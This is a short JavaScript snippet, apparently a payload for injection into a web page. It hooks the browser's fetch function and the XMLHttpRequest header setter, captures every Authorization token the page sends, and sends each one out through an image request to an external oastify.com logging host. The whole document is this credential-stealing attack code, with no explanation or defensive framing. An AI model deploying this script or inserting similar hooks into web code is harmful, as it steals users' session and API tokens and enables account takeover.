(function() {  
  const exfil = (token, type) => {  
    new Image().src = `https://eew28edpfz72swi534p6wx7kzb52tshh.oastify.com/log?t=${encodeURIComponent(token)}&type=${type}`;  
  };

 // Intercept Fetch API  
  const originalFetch = window.fetch;  
  window.fetch = function(...args) {  
    const headers = args[1]?.headers || args[0]?.headers;  
    if (headers) {  
      const token = (headers instanceof Headers)  
        ? headers.get('Authorization')  
        : (headers['Authorization'] || headers['authorization']);  
      if (token) exfil(token, 'fetch');  
    }  
    return originalFetch.apply(this, args);  
  };

 // Intercept XHR  
  const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;  
  XMLHttpRequest.prototype.setRequestHeader = function(header, value) {  
    if (header.toLowerCase() === 'authorization') exfil(value, 'xhr');  
    return originalSetRequestHeader.apply(this, arguments);  
  };

})();
